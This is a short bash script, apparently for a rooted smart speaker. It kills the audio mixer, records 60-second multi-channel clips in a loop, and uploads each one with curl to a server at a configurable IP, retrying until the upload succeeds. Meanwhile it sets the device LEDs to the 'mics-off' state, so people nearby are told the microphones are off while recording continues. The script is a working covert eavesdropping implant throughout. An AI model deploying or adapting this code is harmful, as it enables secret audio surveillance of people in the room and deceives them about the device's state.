#!/bin/bash

HOST="http://192.168.1.81"  # Replace with the local IP of the machine running the server script.

send_request() {
    local timestamp=$(date +"%Y.%m.%d %H:%M:%S")

    echo "Sending audio at $timestamp"

    # Upload the recorded wav to server
    /data/local/tmp/curl -X PUT -F "file=@/data/local/tmp/out.wav" $HOST/audio
    local status_code=$?

    return $status_code
}

handle_unsuccessful_req() {
    while true; do
        send_request
        status_code=$?
        if [[ $status_code -eq 0 ]]; then
            break
        else
            echo "Retrying in 30 seconds..."
            sleep 30
        fi
    done
}

ledctrl -s mics-off_start -b 100
ledctrl -s mics-off_on -b 100

while true; do
    # Kill mixer process which takes control of audio interfaces
    killall mixer

    # Record audio
    nohup tinycap /data/local/tmp/out.wav -D 0 -d 24 -r 16000 -b 24 -c 9 -p 512 -n 5 -t=1 -f &
    sleep 60
    killall tinycap

    send_request
    status_code=$?

    if [[ $status_code -ne 0 ]]; then
        echo "Request failed. Retrying..."
        handle_unsuccessful_req
    fi

    rm -f out.wav
done
